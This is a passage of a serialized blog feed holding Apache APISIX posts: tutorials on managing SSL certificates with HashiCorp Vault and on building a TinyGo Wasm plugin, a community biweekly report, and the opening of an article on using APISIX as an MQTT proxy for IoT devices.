APISIX","metadata":{"permalink":"/blog/2023/07/09/apisix-integrates-with-vault","source":"@site/blog/2023/07/09/apisix-integrates-with-vault.md","title":"How to Use Vault to Manage Certificates in APISIX","description":"APISIX can integrate Vault to realize SSL certificate management, allowing for secure storage and management of SSL certificates.","date":"2023-07-09T00:00:00.000Z","formattedDate":"July 9, 2023","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":7.135,"truncated":true,"authors":[{"name":"API7.ai","title":"Author","url":"https://github.com/api7","image_url":"https://avatars.githubusercontent.com/u/61078451?s=200&v=4","imageURL":"https://avatars.githubusercontent.com/u/61078451?s=200&v=4"}],"prevItem":{"title":"Accelerating API Gateway Excellence: Apache APISIX Community Meetup in Malaysia","permalink":"/blog/2023/07/11/2023-apisix-meetup-malaysia"},"nextItem":{"title":"A \\"Tiny\\" APISIX Plugin","permalink":"/blog/2023/07/07/tiny-apisix-plugin"}},"content":">This article takes configuring HTTPS communication between the downstream client and APISIX as an example to introduce how APISIX integrates Vault to implement SSL certificate management.\\n\x3c!--truncate--\x3e\\n\\nAPI gateway is a key basic component in API lifecycle management. It is the entrance of all traffic and is responsible for routing API requests from downstream clients to the correct upstream service for processing. Therefore, the API gateway works for the network communication between the upstream services and the downstream clients.\\n\\nAs a new cloud-native API gateway, Apache APISIX provides the TLS/mTLS communication mechanism between the downstream clients and APISIX, and that between APISIX and upstream services, so as to ensure the network security between them. APISIX saves the SSL certificate as an SSL certificate object, and realizes the dynamic loading of the SSL certificate through the extension SNI (Server Name Indication) that supports the TLS protocol.\\n\\nIn order to securely store the SSL certificates in APISIX, APISIX has achieved integration with HashiCorp Vault, thus realizing the unified management of SSL certificates by taking advantage of Vault\'s secret security storage. This article takes configuring HTTPS communication between the downstream client and APISIX as an example to introduce how APISIX integrates Vault to implement SSL certificate management.\\n\\n![Integrate APISIX with Vault](https://static.apiseven.com/uploads/2023/06/02/mro1F6j9_vault-store-certs.png)\\n\\n## What Is SSL Certificate\\n\\nSSL/TLS is a cryptographic protocol that protects the security of network communication by establishing an encrypted network connection between the two communicating parties. The SSL/TLS protocol ensures that data is sent to the correct client and server by authenticating users and servers. In addition, the SSL/TLS protocol can encrypt communication data, thereby ensuring that data cannot be stolen, tampered with or forged during transmission.\\n\\nAn SSL certificate is a digital certificate that authenticates a website\'s identity and enables an encrypted connection using the SSL/TLS protocol. An SSL certificate is usually issued by a trusted digital certificate authority (CA), which mainly includes the following information:\\n\\n* Domain name\\n* Certificate authority\\n* Digital signature signed by the certificate authority\\n* Associated subdomains\\n* Issue date of certificates\\n* Expiration date of certificates\\n* The public key (while the private key is a secret key)\\n\\n## What Is HashiCorp Vault\\n\\nHashiCorp Vault (hereinafter referred to as Vault) is an enterprise-level Secret management tool that can store and manage sensitive data such as tokens, passwords, and certificates. Vault can be integrated with technologies in the entire IT system, provide identity-based security automation and encryption services, centrally control access to sensitive data and systems, and help organizations reduce the risk of data leakage and data exposure, thereby improving cloud and application security.\\n\\n![HashiCorp Vault](https://static.apiseven.com/uploads/2023/06/02/wuRcIbeH_vault.png)\\n\\n## How to Store APISIX SSL Certificates in Vault\\n\\n### Environment Preparation\\n\\n* Install [Docker](https://docs.docker.com/get-docker/)\\n* Install [cURL](https://curl.se/)\\n* A running APISIX service, or follow [Getting Started tutorial](https://docs.api7.ai/apisix/getting-started/) to deploy an APISIX Docker container\\n\\n### Deploy and Configure Vault Service\\n\\nIn this section, we will use Docker to deploy a Vault container service. You can skip this section if you already have a Vault service instance available in your environment.\\n\\nCreate and deploy a Vault container in Dev mode, named `apisix-quickstart-vault`. Specify the Vault Token as `apisix-quickstart-vault-token` and map port `8200` to the host:\\n\\n```shell\\ndocker run -d --cap-add=IPC_LOCK \\\\\\n  -e \'VAULT_DEV_LISTEN_ADDRESS=0.0.0.0:8200\' \\\\\\n  -e \'VAULT_ADDR=http://0.0.0.0:8200\' \\\\\\n  -e \'VAULT_DEV_ROOT_TOKEN_ID=apisix-quickstart-vault-token\' \\\\\\n  -e \'VAULT_TOKEN=apisix-quickstart-vault-token\' \\\\\\n  --network=apisix-quickstart-net \\\\\\n  --name apisix-quickstart-vault \\\\\\n  -p 8200:8200 vault:1.13.0\\n```\\n\\nSelect `kv` as the APISIX SSL certificate storage path:\\n\\n```shell\\ndocker exec apisix-quickstart-vault vault secrets enable -path=kv -version=1 kv\\n```\\n\\n### Configure APISIX\\n\\nAPISIX needs to read SSL certificates from Vault, so Vault should grant read permission to APISIX on the specified path.\\n\\nCreate a Vault policy named `apisix-policy.hcl`, granting APISIX read access to the path `kv/apisix/`:\\n\\n```shell\\ndocker exec apisix-quickstart-vault /bin/sh -c \\"echo \'\\npath \\\\\\"kv/apisix/*\\\\\\" {\\n    capabilities = [\\\\\\"read\\\\\\"]\\n}\\n\' > /etc/apisix-policy.hcl\\"\\n```\\n\\nApply the created policy file `apisix-policy.hcl` to Vault:\\n\\n```shell\\ndocker exec apisix-quickstart-vault vault policy write apisix-policy /etc/apisix-policy.hcl\\n```\\n\\nCreate an APISIX secret object with the id `quickstart-secret-id` to save the Vault connection information and certificate storage path:\\n\\n```shell\\ncurl -i \\"http://127.0.0.1:9180/apisix/admin/secrets/vault/quickstart-secret-id\\" -X PUT -d \'\\n{\\n    \\"uri\\": \\"http://apisix-quickstart-vault:8200\\",\\n    \\"prefix\\": \\"kv/apisix\\",\\n    \\"token\\" : \\"apisix-quickstart-vault-token\\"\\n}\'\\n```\\n\\n### Store SSL Certificates in Vault\\n\\nCreate a self-signed CA certificate `ca.crt` and key `ca.key`:\\n\\n```shell\\nopenssl genrsa -out ca.key 2048 && \\\\\\n  openssl req -new -sha256 -key ca.key -out ca.csr -subj \\"/CN=ROOTCA\\" && \\\\\\n  openssl x509 -req -days 36500 -sha256 -extensions v3_ca -signkey ca.key -in ca.csr -out ca.crt\\n```\\n\\nThe SSL certificate `server.crt` and the key `server.key` are issued by the CA, and its common name (CN) is `test.com`:\\n\\n```shell\\nopenssl genrsa -out server.key 2048 && \\\\\\n  openssl req -new -sha256 -key server.key -out server.csr -subj \\"/CN=test.com\\" && \\\\\\n  openssl x509 -req -days 36500 -sha256 -extensions v3_req \\\\\\n  -CA ca.crt -CAkey ca.key -CAserial ca.srl -CAcreateserial \\\\\\n  -in server.csr -out server.crt\\n```\\n\\nCopy the issued SSL certificate and key to the Vault container:\\n\\n```shell\\ndocker cp server.key apisix-quickstart-vault:/root/\\ndocker cp server.crt apisix-quickstart-vault:/root/\\n```\\n\\nUse the `vault kv put` command to store the SSL certificate and key as a secret, the key is `ssl`, and the storage path is `kv/apisix`:\\n\\n```shell\\ndocker exec apisix-quickstart-vault vault kv put kv/apisix/ssl test.com.crt=@/root/server.crt test.com.key=@/root/server.key\\n```\\n\\nThrough the above command, we have stored a secret named `ssl` in Vault, which contains 2 key-value pairs: certificate and private key.\\n\\n## How to Use APISIX SSL Certificate Stored in Vault\\n\\nAPISIX supports TLS/mTLS network encryption between downstream clients and APISIX, and between APISIX and upstream services, where the SSL certificates stored in Vault can be used. We will take configuring HTTPS communication between the client and APISIX as an example to demonstrate how to use the SSL certificate stored in Vault in APISIX.\\n\\n### Configure HTTPS Communication Between Client and APISIX\\n\\nCreate an SSL certificate object to hold the SSL certificate:\\n\\n```shell\\ncurl -i \\"http://127.0.0.1:9180/apisix/admin/ssls\\" -X PUT -d \'\\n{\\n  \\"id\\": \\"quickstart-tls-client-ssl\\",\\n  \\"sni\\": \\"test.com\\",\\n  \\"cert\\": \\"$secret://vault/quickstart-secret-id/ssl/test.com.crt\\",\\n  \\"key\\": \\"$secret://vault/quickstart-secret-id/ssl/test.com.key\\"\\n}\'\\n```\\n\\nThe `sni` of this object is `test.com`, which is consistent with the CN that issued the certificate. The `cert` and `key` correspond to the issued certificate and private key, which are automatically obtained from the Vault through the established secret resource locator, and the resource locator rules are:\\n\\n```text\\n$secret://$manager/$id/$secret_name/$key\\n```\\n\\n* manager: key management service Vault\\n* id: APISIX secret resource ID\\n* secret_name: the secret name in Vault\\n* key: the key of the key-value pair in the secret named secret_name\\n\\n### Verify HTTPS Communication Between Client and APISIX\\n\\nCreate a route to forward all requests sent to `/ip` to upstream `httpbin.org`:\\n\\n```shell\\ncurl -i \\"http://127.0.0.1:9180/apisix/admin/routes\\" -X PUT -d \'\\n{\\n  \\"id\\": \\"quickstart-client-ip\\",\\n  \\"uri\\": \\"/ip\\",\\n  \\"upstream\\": {\\n    \\"nodes\\": {\\n      \\"httpbin.org:80\\":1\\n    },\\n    \\"type\\": \\"roundrobin\\"\\n  }\\n}\'\\n```\\n\\nUse cURL to send a request to `https://test.com:9443/ip`, `test.com` resolves to `127.0.0.1`:\\n\\n```shell\\ncurl -ikv --resolve \\"test.com:9443:127.0.0.1\\" \\"https://test.com:9443/ip\\"\\n```\\n\\nIf the configuration is successful, the client and APISIX TLS handshake process returned by cURL will be the same as the following results:\\n\\n```text\\n* Added test.com:9443:127.0.0.1 to DNS cache\\n* Hostname test.com was found in DNS cache\\n*   Trying 127.0.0.1:9443...\\n* Connected to test.com (127.0.0.1) port 9443 (#0)\\n* ALPN, offering h2\\n* ALPN, offering http/1.1\\n* successfully set certificate verify locations:\\n*  CAfile: /etc/ssl/certs/ca-certificates.crt\\n*  CApath: /etc/ssl/certs\\n* TLSv1.3 (OUT), TLS handshake, Client hello (1):\\n* TLSv1.3 (IN), TLS handshake, Server hello (2):\\n* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):\\n* TLSv1.3 (IN), TLS handshake, Certificate (11):\\n* TLSv1.3 (IN), TLS handshake, CERT verify (15):\\n* TLSv1.3 (IN), TLS handshake, Finished (20):\\n* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):\\n* TLSv1.3 (OUT), TLS handshake, Finished (20):\\n* SSL connection using TLSv1.3 / TLS_AES_256_GCM_SHA384\\n* ALPN, server accepted to use h2\\n* Server certificate:\\n*  subject: CN=test.com\\n*  start date: Apr 21 07:47:54 2023 GMT\\n*  expire date: Mar 28 07:47:54 2123 GMT\\n*  issuer: CN=ROOTCA\\n*  SSL certificate verify result: unable to get local issuer certificate (20), continuing anyway.\\n* Using HTTP2, server supports multi-use\\n* Connection state changed (HTTP/2 confirmed)\\n* Copying HTTP/2 data in stream buffer to connection buffer after upgrade: len=0\\n* Using Stream ID: 1 (easy handle 0x556274d632e0)\\n> GET /ip HTTP/2\\n> Host: test.com:9443\\n> user-agent: curl/7.74.0\\n> accept: */*\\n>\\n* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):\\n* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):\\n* old SSL session ID is stale, removing\\n* Connection state changed (MAX_CONCURRENT_STREAMS == 128)!\\n< HTTP/2 200\\nHTTP/2 200\\n...\\n```\\n\\n## Summary\\n\\nWe introduced how APISIX integrates Vault to implement SSL certificate management and showed the configuration and integration steps in detail taking HTTPS communication between downstream clients and APISIX as an example."},{"id":"A \\"Tiny\\" APISIX Plugin","metadata":{"permalink":"/blog/2023/07/07/tiny-apisix-plugin","source":"@site/blog/2023/07/07/tiny-apisix-plugin.md","title":"A \\"Tiny\\" APISIX Plugin","description":"A \\"tiny\\" example to demonstrate how Apache APISIX supports Wasm plugins.","date":"2023-07-07T00:00:00.000Z","formattedDate":"July 7, 2023","tags":[{"label":"Plugins","permalink":"/blog/tags/plugins"}],"readingTime":5.095,"truncated":true,"authors":[{"name":"Navendu Pottekkat","title":"Author","url":"https://github.com/navendu-pottekkat","image_url":"https://avatars.githubusercontent.com/u/49474499","imageURL":"https://avatars.githubusercontent.com/u/49474499"}],"prevItem":{"title":"How to Use Vault to Manage Certificates in APISIX","permalink":"/blog/2023/07/09/apisix-integrates-with-vault"},"nextItem":{"title":"Biweekly Report (June 19 - July 02)","permalink":"/blog/2023/07/05/weekly-report"}},"content":"> In this article, we will write a \\"tiny\\" Go plugin for APISIX, compile it to a Wasm binary, run it in APISIX, and learn how it all works. We will also compare the benefits and costs of using Wasm plugins, external plugins (plugin runners), and native Lua plugins.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://navendu.me/posts/tiny-apisix-plugin/\\" />\\n</head>\\n\\nA key feature of Apache APISIX is its pluggable architecture. In addition to providing [80+ Lua plugins](https://apisix.apache.org/plugins/) out of the box, APISIX also supports external plugins written in other languages through [plugin runners](https://apisix.apache.org/docs/go-plugin-runner/getting-started/) and [WebAssembly (Wasm)](https://apisix.apache.org/docs/apisix/wasm/).\\n\\nIn this article, we will write a \\"tiny\\" Go plugin for APISIX, compile it to a Wasm binary, run it in APISIX, and learn how it all works. We will also compare the benefits and costs of using Wasm plugins, external plugins (plugin runners), and native Lua plugins.\\n\\n## APISIX and Wasm\\n\\nAPISIX supports Wasm through the [WebAssembly for Proxies (proxy-wasm) specification](https://github.com/proxy-wasm/spec). APISIX is a host environment that implements the specification, and developers can use the [SDKs](https://github.com/proxy-wasm/spec#sdks) available in multiple languages to create plugins.\\n\\nUsing Wasm plugins in APISIX has multiple advantages:\\n\\n* Many programming languages compile to Wasm. This allows you to leverage the capabilities of your tech stack in APISIX plugins.\\n* The plugins run inside APISIX and not on external plugin runners. This means you compromise less on performance while writing external plugins.\\n* Wasm plugins run inside APISIX but in a separate VM. So even if the plugin crashes, APISIX can continue to run.\\n* _APISIX can only maintain its Wasm support without having to maintain plugin runners for multiple languages\\\\*._\\n\\n_\\\\* These advantages come with a set of caveats which we will look at later._\\n\\nAPISIX\'s plugin architecture below shows native Lua plugins, external plugins through plugin runners, and Wasm plugins:\\n\\n![Lua plugins, plugin runners, and Wasm plugins](https://static.apiseven.com/uploads/2023/06/27/yBnZnCrv_plugin-route-light.png)\\n\\n## A \\"Tiny\\" Go Plugin\\n\\nLet\'s get coding! To write a Go plugin, we will use the [proxy-wasm-go-sdk](https://github.com/tetratelabs/proxy-wasm-go-sdk).\\n\\nReading through the documentation, you will understand why this plugin is called \\"tiny,\\" i.e., the SDK uses the [TinyGo](https://tinygo.org/) compiler instead of the official Go compiler. You can read more about why this is the case on the [SDK\\\\\'s overview page](https://github.com/tetratelabs/proxy-wasm-go-sdk/blob/main/doc/OVERVIEW.md), but the TLDR version is that the Go compiler can only produce Wasm binaries that run in the browser.\\n\\nFor our example, we will create a plugin that adds a response header. The code below is pretty self-explanatory, and you can refer to [other plugins](https://github.com/apache/apisix/blob/master/t/wasm/) for more implementation details:\\n\\n```go title=\\"main.go\\"\\n// references:\\n// https://github.com/tetratelabs/proxy-wasm-go-sdk/tree/main/examples\\n// https://github.com/apache/apisix/blob/master/t/wasm/\\npackage main\\n\\nimport (\\n    \\"github.com/tetratelabs/proxy-wasm-go-sdk/proxywasm\\"\\n    \\"github.com/tetratelabs/proxy-wasm-go-sdk/proxywasm/types\\"\\n\\n    \\"github.com/valyala/fastjson\\"\\n)\\n\\nfunc main() {\\n    proxywasm.SetVMContext(&vmContext{})\\n}\\n\\n// each plugin has its own VMContext.\\n// it is responsible for creating multiple PluginContexts for each route.\\ntype vmContext struct {\\n    types.DefaultVMContext\\n}\\n\\n// each route has its own PluginContext.\\n// it corresponds to one instance of the plugin.\\nfunc (*vmContext) NewPluginContext(contextID uint32) types.PluginContext {\\n    return &pluginContext{}\\n}\\n\\ntype header struct {\\n    Name  string\\n    Value string\\n}\\n\\ntype pluginContext struct {\\n    types.DefaultPluginContext\\n    Headers []header\\n}\\n\\nfunc (ctx *pluginContext) OnPluginStart(pluginConfigurationSize int) types.OnPluginStartStatus {\\n    data, err := proxywasm.GetPluginConfiguration()\\n    if err != nil {\\n        proxywasm.LogErrorf(\\"error reading plugin configuration: %v\\", err)\\n        return types.OnPluginStartStatusFailed\\n    }\\n\\n    var p fastjson.Parser\\n    v, err := p.ParseBytes(data)\\n    if err != nil {\\n        proxywasm.LogErrorf(\\"error decoding plugin configuration: %v\\", err)\\n        return types.OnPluginStartStatusFailed\\n    }\\n    headers := v.GetArray(\\"headers\\")\\n    ctx.Headers = make([]header, len(headers))\\n    for i, hdr := range headers {\\n        ctx.Headers[i] = header{\\n            Name:  string(hdr.GetStringBytes(\\"name\\")),\\n            Value: string(hdr.GetStringBytes(\\"value\\")),\\n        }\\n    }\\n    return types.OnPluginStartStatusOK\\n}\\n\\n// each HTTP request to a route has its own HTTPContext\\nfunc (ctx *pluginContext) NewHttpContext(contextID uint32) types.HttpContext {\\n    return &httpContext{parent: ctx}\\n}\\n\\ntype httpContext struct {\\n    types.DefaultHttpContext\\n    parent *pluginContext\\n}\\n\\nfunc (ctx *httpContext) OnHttpResponseHeaders(numHeaders int, endOfStream bool) types.Action {\\n    plugin := ctx.parent\\n    for _, hdr := range plugin.Headers {\\n        proxywasm.ReplaceHttpResponseHeader(hdr.Name, hdr.Value)\\n    }\\n\\n    return types.ActionContinue\\n}\\n```\\n\\nTo compile our plugin to a Wasm binary, we can run:\\n\\n```shell\\ntinygo build -o custom_response_header.go.wasm -scheduler=none -target=wasi ./main.go\\n```\\n\\n## Configuring APISIX to Run the Plugin\\n\\nTo use the Wasm plugin, we first have to update our APISIX configuration file to add this:\\n\\n```yaml title=\\"config.yaml\\"\\nwasm:\\n  plugins:\\n    - name: custom-response-header\\n      priority: 7000\\n      file: /opt/apisix/wasm/custom_response_header.go.wasm\\n```\\n\\nNow we can create a route and enable this plugin:\\n\\n```yaml title=\\"apisix.yaml\\"\\nroutes:\\n  - uri: /*\\n    upstream:\\n      type: roundrobin\\n      nodes:\\n        \\"127.0.0.1:80\\": 1\\n    plugins:\\n      custom-response-header:\\n       conf: |\\n        {\\n          \\"headers\\": [{\\n            \\"name\\": \\"X-Go-Wasm\\", \\"value\\": \\"APISIX\\"\\n          }]\\n        }\\n#END\\n```\\n\\n:::note\\n\\nThe above configuration assumes that APISIX is deployed in [standalone mode](https://apisix.apache.org/docs/apisix/deployment-modes/#standalone).\\n\\n:::\\n\\n## Testing the Plugin\\n\\nWe can send a request to the created route to test the plugin:\\n\\n```shell\\ncurl http://127.0.0.1:9080 -s --head\\n```\\n\\nThe response header would be as shown below:\\n\\n```text\\n...\\nX-Go-Wasm: APISIX\\n```\\n\\n## Wasm for the Win?\\n\\nFrom this article, it seems like using Wasm plugins benefits both users and APISIX maintainers.\\n\\nA test using our example `custom-response-header` function implemented through a Lua plugin, an external Go plugin runner, and a Wasm plugin show how the performance varies:\\n\\n![Wasm plugins aren\'t that bad!](https://static.apiseven.com/uploads/2023/06/27/bbkiAJgI_plugin-performance-light.png)\\n\\n_Running 30s tests with 5 threads and 50 connections using [wrk](https://github.com/wg/wrk)._\\n\\nLooking solely at this example, it might be tempting to ask why anyone would want to use plugin runners or write Lua plugins.\xa0Well, all the advantages of using Wasm comes with the following caveats:\\n\\n* **Limited plugins**: The Wasm implementation of programming languages often lacks complete support. For Go, we were limited to using the TinyGo compiler, similar to other languages.\\n* **Immature stack**: Wasm and its usage outside the browser is still a relatively new concept. The proxy-wasm spec also has its limitations due to its relative novelty.\\n* **Lack of concurrency**: Wasm does not have built-in concurrency support. This could be a deal breaker for typical APISIX uses cases where high performance is critical.\\n* **Better alternatives**: Since APISIX can be extended using Lua plugins or plugin runners, there are always alternatives to using Wasm.\\n\\nDespite these caveats, the future of Wasm in APISIX and other proxies seems promising. You can choose to hop on the Wasm bandwagon if its benefits tip the scale against these costs. But currently, APISIX plans to continue supporting all three ways of creating custom plugins for the foreseeable future."},{"id":"Biweekly Report (June 19 - July 02)","metadata":{"permalink":"/blog/2023/07/05/weekly-report","source":"@site/blog/2023/07/05/weekly-report.md","title":"Biweekly Report (June 19 - July 02)","description":"The Apache APISIX Community Biweekly Report can help community members better grasp the progress of the Apache APISIX community so that everyone can participate in the Apache APISIX community.","date":"2023-07-05T00:00:00.000Z","formattedDate":"July 5, 2023","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.305,"truncated":true,"authors":[],"prevItem":{"title":"A \\"Tiny\\" APISIX Plugin","permalink":"/blog/2023/07/07/tiny-apisix-plugin"},"nextItem":{"title":"Connecting IoT Devices to the Cloud with APISIX MQTT Proxy","permalink":"/blog/2023/06/30/apisix-mqtt-proxy"}},"content":"> We have recently fixed and improved some features of Apache APISIX, including optimizing the use of Prometheus, fixing the body-transformer and log-rotate plugins, and adding an annotation to allow rewriting of the response header for Apache APISIX Ingress Controller. Meanwhile, We are pleased to present Apache APISIX 3.4.0 with exciting new features and performance improvements. For more details, please read this biweekly report.\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX grew up as a community from the first day it was open-sourced, and quickly became the most active open-source API gateway project in the world. These achievements are inseparable from the joint efforts of community partners.\\n\\nFrom 6.19 to 7.02, 22 contributors submitted 35 commits for Apache APISIX. Thank you for your contributions to Apache APISIX.\\n\\nWe have recently fixed and improved some features, and the summary of the updates is as follows:\\n\\n1. APISIX now allows customizing Prometheus default bucket.\\n\\n2. Fixed the problem that body-transformer plugin cannot convert empty tables properly.\\n\\n3. Fixed the issue that max_kept configuration of the log-rotate plugin does not work when using a custom name.\\n\\n4. With recently added annotation, APISIX Ingress Controller now allows rewriting of response headers.\\n\\n\\"If you want to go fast, go alone. If you want to go far, go together.\\" The Apache APISIX Community Biweekly Report can help community members better grasp the progress of the Apache APISIX community so that everyone can participate in the Apache APISIX community.\\n\\n## Contributor Statistics\\n\\n![Apache APISIX Contributors List](https://static.apiseven.com/uploads/2023/07/21/V68ySc8U_0619-0702.png)\\n\\n![Apache APISIX New Contributors](https://static.apiseven.com/uploads/2023/07/07/M3P3D5AP_%E6%96%B0%E6%99%8B%E8%B4%A1%E7%8C%AE%E8%80%85%E6%B5%B7%E6%8A%A5.png)\\n\\n## Highlights of Recent Features\\n\\n### Apache APISIX\\n\\n- [APISIX allows customizing prometheus default bucket](https://github.com/apache/apisix/pull/9673) (Contributor: [jiangfucheng](https://github.com/jiangfucheng))\\n\\n- [Fix the problem that body-transformer plugin cannot convert empty tables properly](https://github.com/apache/apisix/pull/9669) (Contributor: [kingluo](https://github.com/kingluo))\\n\\n- [Fix the issue that max_kept configuration of the log-rotate plugin does not work when using a custom name](https://github.com/apache/apisix/pull/9749) (Contributor: [monkeyDluffy6017](https://github.com/monkeyDluffy6017))\\n\\n### Apache APISIX Ingress Controller\\n\\n- [APISIX Ingress Controller adds annotation to allow rewriting of response headers](https://github.com/apache/apisix-ingress-controller/pull/1861) (Contributor: [Revolyssup](https://github.com/Revolyssup))\\n\\n## Recent Blog Recommendations\\n\\n- [Release Apache APISIX 3.4.0](https://apisix.apache.org/blog/2023/06/30/release-apache-apisix-3.4.0/)\\n\\n  This release provides a new plugin loki-logger to forward logs to Grafana Loki, and allows for mTLS connection on the route level. In addition, the release also includes many other updates to continuously enhance the user experience of APISIX.\\n\\n- [Connecting IoT Devices to the Cloud with APISIX MQTT Proxy](https://apisix.apache.org/blog/2023/06/30/apisix-mqtt-proxy/)\\n\\n  APISIX\'s support for stream routes and, in extension, the MQTT protocol is often overlooked. Let\'s change this by looking at an end-to-end example of how APISIX can act as an MQTT proxy.\\n\\nA wealth of documentation tutorials and experience has been accumulated on the Apache APISIX official website and GitHub. If you encounter problems, you can look into the documentation, search keywords in the issues, or participate in the discussion on the issues, proposing your own ideas and practical experience."},{"id":"Connecting IoT Devices to the Cloud with APISIX MQTT Proxy","metadata":{"permalink":"/blog/2023/06/30/apisix-mqtt-proxy","source":"@site/blog/2023/06/30/apisix-mqtt-proxy.md","title":"Connecting IoT Devices to the Cloud with APISIX MQTT Proxy","description":"A guide to using Apache APISIX as an MQTT proxy to connect IoT devices to the cloud.","date":"2023-06-30T00:00:00.000Z","formattedDate":"June 30, 2023","tags":[{"label":"Plugins","permalink":"/blog/tags/plugins"}],"readingTime":6.055,"truncated":true,"authors":[{"name":"Navendu Pottekkat","title":"Author","url":"https://github.com/navendu-pottekkat","image_url":"https://avatars.githubusercontent.com/u/49474499","imageURL":"https://avatars.githubusercontent.com/u/49474499"}],"prevItem":{"title":"Biweekly Report (June 19 - July 02)","permalink":"/blog/2023/07/05/weekly-report"},"nextItem":{"title":"Release Apache APISIX 3.4.0","permalink":"/blog/2023/06/30/release-apache-apisix-3.4.0"}},"content":"> APISIX\'s support for [stream routes](https://apisix.apache.org/docs/apisix/stream-proxy/) and, in extension, the MQTT protocol is often overlooked. Let\'s change this by looking at an end-to-end example of how APISIX can act as an MQTT proxy.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://navendu.me/posts/iot-to-cloud/\\" />\\n</head>\\n\\nPeople typically use the [MQTT protocol](https://mqtt.org/) when transferring data from IoT devices because of its low overhead and ease of implementation.\\n\\nMQTT was created for sending small chunks of data over unreliable networks and uses a binary format rather than the typical text-based format used in protocols like HTTP or SMTP. With [client libraries](https://mqtt.org/software/) in multiple programming languages, you are unlikely to have to implement the protocol on your own but use an existing library.\\n\\nAs your IoT devices move to the cloud, you face a different challenge of managing multiple protocols seamlessly. Questions arise like \\"How can I use a single entry point for all my traffic?\\", \\"How do I decouple my IoT and cloud infrastructure with little overhead?\\", and \\"How can I do all this securely?\\"\\n\\nThis article attempts to answer these questions using Apache APISIX, which supports HTTP and MQTT protocols, to proxy requests between your devices, message brokers, and the cloud.\\n\\n## Why an MQTT Proxy?\\n\\n[APISIX](https://apisix.apache.org/) is primarily used as an API gateway for routing HTTP traffic.\\n\\nAs an IoT developer recently pointed out, APISIX\'s support for [stream routes](https://apisix.apache.org/docs/apisix/stream-proxy/) and, in extension, the MQTT protocol is often overlooked. Let\'s change this by looking at an end-to-end example of how APISIX can act as an MQTT proxy.\\n\\nIn this example, you own two warehouses and an office. Data from your warehouses and the office are sent to the storage, monitoring, and analytics services deployed in your cloud through APISIX over HTTP. We will refer to this as \\"the system.\\"\\n\\n![The system](https://static.apiseven.com/uploads/2023/06/23/kYSewzBm_system.png)\\n\\n_Apache APISIX will route all requests from your warehouses and office to appropriate services in your cloud backend._\\n\\nYou now decide to add two IoT devices to improve the efficiency of the system:\\n\\n1. A flow meter to measure the flow rate of water in your warehouses.\\n2. A light sensor to measure the illuminance in your office and warehouses.\\n\\nThese devices are small, energy-efficient, and support the MQTT protocol. The measurements from the flow meter are used by an automatic valve to control the water flow rate, and the light sensor is used to maintain optimal lighting.\\n\\n![System upgrade](https://static.apiseven.com/uploads/2023/06/23/RFsl83wC_iot-system.png)\\n\\n_Here, the devices will send messages directly to your MQTT broker. Multiple clients including phones, PCs, valves, and your cloud services are subscribed to the broker._\\n\\nAs shown above, you can deploy this system independently from your cloud infrastructure. But the toll of maintaining separate infrastructures for your IoT devices and cloud can also be pretty high both in terms of cost and effort.\\n\\nHowever, combining the two systems is not a trivial task. You must work with multiple protocols but use a single entry point to reduce infrastructure costs and maintenance overhead. This is where being pragmatic and using APISIX pays you off.\\n\\n## A Unified Entry Point\\n\\nApache APISIX supports MQTT and HTTP protocols and can work as a proxy between your IoT devices and the cloud. APISIX supports this through the [mqtt-proxy](https://apisix.apache.org/docs/apisix/plugins/mqtt-proxy/) plugin, which allows it to load balance and route MQTT messages between brokers.\\n\\nWith the APISIX MQTT proxy, your system can look something like this:\\n\\n![APISIX MQTT proxy](https://static.apiseven.com/uploads/2023/06/23/ZDWIZblC_mqtt-proxy.png)\\n\\n_Now in addition to your HTTP traffic, APISIX also manages your MQTT traffic and can route it between your message brokers._\\n\\nAPISIX will do all the heavy lifting and process both HTTP and MQTT requests, removing any additional overhead from your cloud or IoT devices.\\n\\nRouting MQTT messages is useful when you want to use multiple brokers. The `mqtt-proxy` plugin routes the messages based on its `clientId` using a consistent hashing algorithm. This allows you to send messages from different clients to different brokers dynamically. For example, you can send messages from the flow meters and light sensors to different brokers.\\n\\nIn practice, you can configure this in the `mqtt-proxy` plugin. The example below shows the configuration in [standalone mode](https://apisix.apache.org/docs/apisix/deployment-modes/#standalone):\\n\\n```yaml title=\\"config.yaml\\"\\napisix:\\n  enable_admin: false\\n  stream_proxy:\\n    only: false # allow HTTP as well\\n    tcp:\\n      - addr: 9000\\n        tls: false\\ndeployment:\\n  role: data_plane # deploy APISIX in standalone mode as a data plane\\n  role_data_plane:\\n    config_provider: yaml\\nstream_plugins:\\n  - mqtt-proxy # enable the mqtt-proxy plugin\\n#END\\n```\\n\\n```yaml title=\\"apisix.yaml\\"\\nstream_routes:\\n  - id: 1\\n    upstream_id: 1\\n    plugins:\\n      mqtt-proxy:\\n        protocol_name: \\"MQTT\\"\\n        protocol_level: 5 # use MQTT 5.0\\nupstreams:\\n  # configure multiple brokers\\n  - nodes:\\n      \\"host.docker.internal:1883\\": 1\\n      \\"host.docker.internal:1884\\": 1\\n    type: chash\\n    key: mqtt_client_id\\n    id: 1\\n#END\\n```\\n\\nYou can also use the [Admin API](https://apisix.apache.org/docs/apisix/admin-api/) to configure this on the fly:\\n\\n```shell\\ncurl http://127.0.0.1:9180/apisix/admin/stream_routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"plugins\\": {\\n        \\"mqtt-proxy\\": {\\n            \\"protocol_name\\": \\"MQTT\\",\\n            \\"protocol_level\\": 5\\n        }\\n    },\\n    \\"upstream\\": {\\n        \\"type\\": \\"chash\\",\\n        \\"key\\": \\"mqtt_client_id\\",\\n        \\"nodes\\": [\\n        {\\n            \\"host\\": \\"host.docker.internal\\",\\n            \\"port\\": 1883,\\n            \\"weight\\": 1\\n        },\\n        {\\n            \\"host\\": \\"host.docker.internal\\",\\n            \\"port\\": 1884,\\n            \\"weight\\": 1\\n        }\\n        ]\\n    }\\n}\'\\n```\\n\\n## Decoupling from the Cloud\\n\\nUsing multiple message brokers is a straightforward way to separate the cloud from your IoT devices while keeping them 